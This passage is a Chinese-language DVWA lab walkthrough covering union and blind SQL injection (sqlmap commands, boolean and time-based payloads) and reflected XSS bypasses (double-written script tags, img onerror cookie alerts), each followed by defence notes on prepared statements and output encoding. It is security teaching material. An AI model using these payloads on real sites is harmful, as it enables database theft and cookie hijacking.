<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#high-6 aria-label=锚点>#</a></span></h3><p><strong>源码分析</strong></p><ol><li>前端校验，弹出了一个新的框，使得机器测试无效，但是依旧可以手工注入</li><li>后端校验<ol><li>依旧对输入的id不做任何校验</li><li>关闭了报错提示，因此无法使用报错注入，但是可以使用<strong>联合查询注入</strong></li></ol></li></ol><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441968.png alt=image-20221201151452351></figure></p><blockquote><p>group_concat() 函数把查询结果合并成一个字符串返回</p><p>1 or 1 = 1 union select group_concat(user_id),group_concat(password) from users #</p><p><code>1' union select group_concat(user),group_concat(password) from users #</code></p></blockquote><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441213.png alt=image-20221201153754044></figure></p><div id=impossible-6 class=anchor>impossible></div><h3 class="relative group">impossible
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#impossible-6 aria-label=锚点>#</a></span></h3><p>查询被改为参数化查询（而不是动态的），这意味着查询已由开发人员确切定义，并区分哪些部分是代码，哪些部分是数据。</p><p>Impossible 级别的代码采用了 PDO 技术，防止代码和查询数据的混杂。同时当返回的查询结果数量为一时才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken 机制的加入了进一步提高了安全性。</p><div id=总结与防御-5 class=anchor>总结与防御></div><h3 class="relative group">总结与防御
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%80%bb%e7%bb%93%e4%b8%8e%e9%98%b2%e5%be%a1-5 aria-label=锚点>#</a></span></h3><p><strong>SQL 注入攻击</strong>就是 Web 程序对用户的输入没有进行合法性判断，从而攻击者可以从前端向后端传入攻击参数，并且该参数被带入了后端执行。在很多情况下开发者会使用<strong>动态的 SQL 语句</strong>，这种语句是在程序执行过程中构造的，不过动态的 SQL 语句很容易被攻击者传入的参数改变其原本的功能。
当我们进行<strong>手工 SQL 注入</strong>时，往往是采取以下几个步骤：</p><ol><li>判断是否存在注入，注入是字符型还是数字型</li><li>猜解SQL查询语句中的字段数；</li><li>确定显示的字段顺序；</li><li>获取当前数据库；</li><li>获取数据库中的表；</li><li>获取表中的字段名；</li><li>下载数据。</li></ol><p>当开发者需要防御 SQL 注入攻击时，可以采用以下方法。</p><ol><li><strong>过滤危险字符</strong>：可以使用正则表达式匹配各种 SQL 子句，例如 select,union,where 等，如果匹配到则退出程序。</li><li><strong>使用预编译语句</strong>：PDO 提供了一个数据访问抽象层，这意味着不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。使用 PDO 预编译语句应该使用占位符进行数据库的操作，而不是直接将变量拼接进去。</li></ol><div id=sql-injection-blindsql盲注 class=anchor>SQL Injection Blind（SQL盲注）></div><h2 class="relative group">SQL Injection Blind（SQL盲注）
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#sql-injection-blindsql%e7%9b%b2%e6%b3%a8 aria-label=锚点>#</a></span></h2><blockquote><p>布尔盲注：<strong>bool 盲注</strong>是在不知道 SQL 查询的返回值，但是知道查询是否成功的情况下，猜测数据库中的敏感信息的手法。</p><p>时间盲注： 提交对执行时间敏感的函数sql语句，或者使用if语句，通过执行时间的长短来判断是否执行成功，比如:正确的话会导致时间很长，错误的话会导致执行时间很短。</p><p>经常使用的函数</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>mid(str,<span style=color:#66d9ef>start</span>,<span style=color:#66d9ef>length</span>)  :<span style=color:#960050;background-color:#1e0010>字符串截取</span>
</span></span><span style=display:flex><span>ORD()    ascii         :<span style=color:#960050;background-color:#1e0010>转换成</span>ascii<span style=color:#960050;background-color:#1e0010>码</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Length</span>()               :<span style=color:#960050;background-color:#1e0010>统计长度</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>version</span>()              :<span style=color:#960050;background-color:#1e0010>查看数据库版本</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>database</span>()             :<span style=color:#960050;background-color:#1e0010>查看当前数据库名</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>user</span>()                 :<span style=color:#960050;background-color:#1e0010>查看当前用户</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sleep()                           :<span style=color:#960050;background-color:#1e0010>延迟函数</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>If</span>(condition,<span style=color:#66d9ef>true</span>,<span style=color:#66d9ef>false</span>)          :<span style=color:#960050;background-color:#1e0010>条件语句</span>
</span></span></code></pre></div><div id=low-7 class=anchor>low></div><h3 class="relative group">low
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#low-7 aria-label=锚点>#</a></span></h3><div id=使用sqlmap class=anchor>使用sqlmap></div><h4 class="relative group">使用sqlmap
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e4%bd%bf%e7%94%a8sqlmap aria-label=锚点>#</a></span></h4><pre tabindex=0><code class=language-sqlmap data-lang=sqlmap># 1.查询是否存在注入点
sqlmap -u &#34;http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit&#34;
# 2.检测站点包含哪些数据库
-dbs
# 3.获取当前数据库名
-current-db
# 4.获取指定数据库中的表名
-tables -D &#39;db_name&#39;
# 5.获取表中的字段
-columns -T &#39;table_name&#39; -D &#39;db_name&#39;
# 6.获取字段的内容
–dump -C “columns_name” -T “table_name” -D “db_name” 
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>sqlmap <span style=color:#f92672>-</span>u <span style=color:#e6db74>&#34;http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#34;</span> <span style=color:#75715e>--cookie=&#34;security=low; PHPSESSID=95olg0v4v82ig83g1uv5kkscq2&#34; --batch
</span></span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441326.png alt=image-20221201194403472></figure></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>sqlmap <span style=color:#f92672>-</span>u <span style=color:#e6db74>&#34;http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#34;</span> <span style=color:#75715e>--cookie=&#34;security=low; PHPSESSID=95olg0v4v82ig83g1uv5kkscq2&#34; --batch --dbs
</span></span></span><span style=display:flex><span><span style=color:#75715e>--current-db
</span></span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441210.png alt=image-20221201194526112></figure></p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441206.png alt=image-20221201194615149></figure></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>--batch -D dvwa -T users -C &#34;user,password&#34; -dump
</span></span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441611.png alt=image-20221201195144111></figure></p><div id=medium-7 class=anchor>medium></div><h3 class="relative group">medium
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#medium-7 aria-label=锚点>#</a></span></h3><blockquote><p>从中级难度开始，sqlmap就找不出注入点了</p></blockquote><p><strong>判断注入类型</strong> 字符 or 数字</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- 若服务器响应时间大于 3 秒，说明 sleep() 函数被执行
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> sleep(<span style=color:#ae81ff>3</span>) <span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>数字</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; and sleep(3) # 字符
</span></span></span></code></pre></div><p>![image-20221201221048686](D:\OneDrive - mail.ynu.edu.cn\note\typoranote\DVWA.assets\image-20221201221048686.png)</p><p><strong>获取数据库名</strong></p><ol><li><p>先获取长度</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#66d9ef>length</span>(<span style=color:#66d9ef>database</span>())<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span> <span style=color:#f92672>#</span> <span style=color:#f92672>&amp;</span>Submit<span style=color:#f92672>=</span>Submit
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>or</span>
</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#66d9ef>if</span>(<span style=color:#66d9ef>length</span>(<span style=color:#66d9ef>database</span>())<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>,sleep(<span style=color:#ae81ff>3</span>),<span style=color:#ae81ff>1</span>) <span style=color:#f92672>#</span> <span style=color:#f92672>&amp;</span>Submit<span style=color:#f92672>=</span>Submit
</span></span></code></pre></div><p>返回exits或发生延时，说明长度为4</p><p>![image-20221201225400230](D:\OneDrive - mail.ynu.edu.cn\note\typoranote\DVWA.assets\image-20221201225400230.png)</p></li><li><p>再逐个尝试具体的字符（有单引号的地方都需要被替换，这里使用ASCII码）</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- 采用二分法的方式逼近答案
</span></span></span><span style=display:flex><span><span style=color:#75715e>-- &gt;a
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> ascii(substr(<span style=color:#66d9ef>database</span>(),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>))<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>97</span><span style=color:#f92672>#</span> <span style=color:#f92672>&amp;</span>Submit<span style=color:#f92672>=</span>Submit
</span></span><span style=display:flex><span><span style=color:#75715e>-- &lt;z
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> ascii(substr(<span style=color:#66d9ef>database</span>(),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>))<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>123</span><span style=color:#f92672>#</span> <span style=color:#f92672>&amp;</span>Submit<span style=color:#f92672>=</span>Submit
</span></span><span style=display:flex><span><span style=color:#75715e>-- &lt;n
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> ascii(substr(<span style=color:#66d9ef>database</span>(),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>))<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>110</span><span style=color:#f92672>#</span> <span style=color:#f92672>&amp;</span>Submit<span style=color:#f92672>=</span>Submit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>-- 时间盲注 形如
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#66d9ef>if</span>((ascii(substr(<span style=color:#66d9ef>database</span>(),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>))<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>110</span>),sleep(<span style=color:#ae81ff>3</span>),<span style=color:#ae81ff>1</span>)<span style=color:#f92672>#</span> <span style=color:#f92672>&amp;</span>Submit<span style=color:#f92672>=</span>Submit
</span></span></code></pre></div></li></ol><p>​ 以此类推可以得出结果dvwa</p><p><strong>猜表的个数</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> (<span style=color:#66d9ef>select</span> <span style=color:#66d9ef>count</span>(<span style=color:#66d9ef>table_name</span>) <span style=color:#66d9ef>from</span> information_schema.tables <span style=color:#66d9ef>where</span> table_schema<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>x64767761)<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>#</span> <span style=color:#f92672>&amp;</span>Submit<span style=color:#f92672>=</span>Submit
</span></span></code></pre></div><p><strong>猜表的表名长度</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#66d9ef>length</span>(substr((<span style=color:#66d9ef>select</span> <span style=color:#66d9ef>table_name</span> <span style=color:#66d9ef>from</span> information_schema.tables <span style=color:#66d9ef>where</span> table_schema<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>x64767761 <span style=color:#66d9ef>limit</span> <span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>1</span>),<span style=color:#ae81ff>1</span>))<span style=color:#f92672>=</span><span style=color:#ae81ff>9</span><span style=color:#f92672>#</span> <span style=color:#f92672>&amp;</span>Submit<span style=color:#f92672>=</span>Submit
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441757.png alt=image-20221201224557158></figure></p><p><strong>猜表名</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> ascii(substr((<span style=color:#66d9ef>select</span> <span style=color:#66d9ef>table_name</span> <span style=color:#66d9ef>from</span> information_schema.tables <span style=color:#66d9ef>where</span> table_schema<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>x64767761 <span style=color:#66d9ef>limit</span> <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>),<span style=color:#ae81ff>1</span>))<span style=color:#f92672>=</span><span style=color:#ae81ff>117</span><span style=color:#f92672>#</span>
</span></span></code></pre></div><div id=high-7 class=anchor>high></div><h3 class="relative group">high
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#high-7 aria-label=锚点>#</a></span></h3><p><strong>分析源码</strong></p><ol><li><p>弹出新框，不能使用脚本</p></li><li><p>随机等待时间，不能使用时间盲注，但是还是可以用布尔盲注</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>rand</span>( <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>5</span> ) <span style=color:#f92672>==</span> <span style=color:#ae81ff>3</span> ) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>sleep</span>( <span style=color:#a6e22e>rand</span>( <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>4</span> ) );
</span></span><span style=display:flex><span>        }
</span></span></code></pre></div></li></ol><div id=impossible-7 class=anchor>impossible></div><h3 class="relative group">impossible
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#impossible-7 aria-label=锚点>#</a></span></h3><p>使用<strong>预编译语句</strong></p><div id=总结与防御-6 class=anchor>总结与防御></div><h3 class="relative group">总结与防御
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%80%bb%e7%bb%93%e4%b8%8e%e9%98%b2%e5%be%a1-6 aria-label=锚点>#</a></span></h3><p><strong>SQL 注入攻击</strong>就是 Web 程序对用户的输入没有进行合法性判断，从而攻击者可以从前端向后端传入攻击参数，并且该参数被带入了后端执行。在很多情况下开发者会使用<strong>动态的 SQL 语句</strong>，这种语句是在程序执行过程中构造的，不过动态的 SQL 语句很容易被攻击者传入的参数改变其原本的功能。SQL 盲注入与普通 SQL 注入相同，只是当攻击者试图利用应用程序进行攻击时，得到的不是有用的报错信息，而是开发人员指定的通用页面。
当我们进行<strong>SQL 盲注</strong>时，往往是采取以下几个步骤：</p><ol><li>判断是否存在注入，注入是字符型还是数字型；</li><li>猜解当前数据库名；</li><li>猜解数据库中的表名；</li><li>猜解表中的字段名；</li><li>猜解数据。</li></ol><p>防御 SQL 注入攻击，可以采用以下方法。</p><ol><li>过滤危险字符</li><li>使用预编译语句</li></ol><div id=xssreflected反射型跨站脚本 class=anchor>XSS（Reflected）（反射型跨站脚本）></div><h2 class="relative group">XSS（Reflected）（反射型跨站脚本）
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#xssreflected%e5%8f%8d%e5%b0%84%e5%9e%8b%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac aria-label=锚点>#</a></span></h2><div id=low-8 class=anchor>low></div><h3 class="relative group">low
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#low-8 aria-label=锚点>#</a></span></h3><p>分析源码可以发现，服务器只是判断了 name 参数是否为空，如果不为空的话就直接打印出来。服务器并没有对 name 参数做任何的过滤和检查，存在明显的 XSS 漏洞。</p><ol><li>偷取cookies</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(document.<span style=color:#a6e22e>cookie</span>)<span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span>
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441076.png alt=image-20221202091530650></figure></p><div id=medium-8 class=anchor>medium></div><h3 class="relative group">medium
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#medium-8 aria-label=锚点>#</a></span></h3><p><strong>源码审计</strong></p><p>对<code>&lt;script></code> 进行简单的替换，可以通过双写绕过</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    $name <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>( <span style=color:#e6db74>&#39;&lt;script&gt;&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $_GET[ <span style=color:#e6db74>&#39;name&#39;</span> ] );
</span></span></code></pre></div><p><strong>发起攻击</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>document</span><span style=color:#f92672>.</span><span style=color:#a6e22e>cookie</span>)<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>改为</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>scr</span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>ipt</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>document</span><span style=color:#f92672>.</span><span style=color:#a6e22e>cookie</span>)<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>scr</span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>ipt</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><div id=high-8 class=anchor>high></div><h3 class="relative group">high
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#high-8 aria-label=锚点>#</a></span></h3><p><strong>源码审计</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    $name <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>( <span style=color:#e6db74>&#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $_GET[ <span style=color:#e6db74>&#39;name&#39;</span> ] );
</span></span></code></pre></div><p>可以不用<code>&lt;script></code>标签</p><p><strong>发起攻击</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span> <span style=color:#a6e22e>onerror</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>document</span><span style=color:#f92672>.</span><span style=color:#a6e22e>cookie</span>)<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441561.png alt=image-20221202094134765></figure></p><div id=impossible-8 class=anchor>impossible></div><h3 class="relative group">impossible
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#impossible-8 aria-label=锚点>#</a></span></h3><p><strong>源码审计</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    <span style=color:#75715e>// Check Anti-CSRF token
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>checkToken</span>($_REQUEST[<span style=color:#e6db74>&#39;user_token&#39;</span>], $_SESSION[<span style=color:#e6db74>&#39;session_token&#39;</span>], <span style=color:#e6db74>&#39;index.php&#39;</span> );
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Get input
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $name <span style=color:#f92672>=</span> <span style=color:#a6e22e>htmlspecialchars</span>($_GET[<span style=color:#e6db74>&#39;name&#39;</span>]);
</span></span></code></pre></div><ol><li><strong>htmlspecialchars()</strong> 函数用于把预定义的字符 &ldquo;&lt;&rdquo; 和 &ldquo;>&rdquo; 转换为 HTML 实体，防止了我们注入 HTML 标签。</li><li>加入 Anti-CSRF token 防护 CSRF 攻击</li></ol><div id=总结与防御-7 class=anchor>总结与防御></div><h3 class="relative group">总结与防御
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%80%bb%e7%bb%93%e4%b8%8e%e9%98%b2%e5%be%a1-7 aria-label=锚点>#</a></span></h3><p>​ <strong>跨站脚本 (Cross-Site Scripting)</strong> 是一种针对 Web 程序的代码注入型漏洞攻击，它允许攻击者将恶意脚本注入网页，使得其他用户浏览网页时收到影响。所谓<strong>反射型 XSS</strong> 就是提交了恶意脚本实现的 XSS 仅对这次访问产生了影响，并非持久性的 XSS 攻击。
​ XSS 的攻击方式为攻击者请求一个带有 payload 的 URL，服务器的响应不会以任何形式包含攻击者的脚本。XSS 漏洞的修复方式有以下 2 种：</p><ol><li><strong>过滤输入的字符</strong>，例如 “ &rsquo; ”，“ " ”，“&lt;”，“>” 等非法字符；</li><li>对输出到页面的数据进行<strong>编码</strong>。</li></ol><div id=xssstored存储型跨站脚本 class=anchor>XSS（Stored）（存储型跨站脚本）></div><h2 class="relative group">XSS（Stored）（存储型跨站脚本）
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#xssstored%e5%ad%98%e5%82%a8%e5%9e%8b%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac aria-label=锚点>#</a></span></h2><blockquote><p><strong>存储型 XSS</strong> 存储在数据库中，直到数据库被重置或者负载被手动删除。</p></blockquote><div id=low-9 class=anchor>low></div><h3 class="relative group">low
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#low-9 aria-label=锚点>#</a></span></h3><p><strong>源码审计</strong></p><blockquote><p>输入一个名字和一段文本，然后网页把输入的信息加入到数据库中，同时服务器也会将服务器的内容回显到网页上。</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;btnSign&#39;</span>])){
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Get input
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// trim(string,charlist) 函数用于移除字符串两侧的空白字符或其他预定义字符
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $message <span style=color:#f92672>=</span> <span style=color:#a6e22e>trim</span>($_POST[<span style=color:#e6db74>&#39;mtxMessage&#39;</span>]);
</span></span><span style=display:flex><span>    $name    <span style=color:#f92672>=</span> <span style=color:#a6e22e>trim</span>($_POST[<span style=color:#e6db74>&#39;txtName&#39;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// stripslashes() 函数用于删除反斜杠，可用于清理从数据库中或者从 HTML 表单中取回的数据。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $message <span style=color:#f92672>=</span> <span style=color:#a6e22e>stripslashes</span>($message);
